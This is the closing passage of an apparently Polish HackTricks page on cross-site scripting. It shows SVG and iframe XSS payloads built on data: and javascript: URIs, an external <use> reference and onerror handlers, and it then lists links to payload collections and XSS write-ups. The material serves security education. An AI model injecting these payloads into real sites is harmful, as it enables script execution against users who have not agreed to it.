<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Znajdź **więcej SVG payloads w** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Różne sztuczki JS & istotne informacje


{{#ref}}
other-js-tricks.md
{{#endref}}

## Zasoby XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Źródła

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
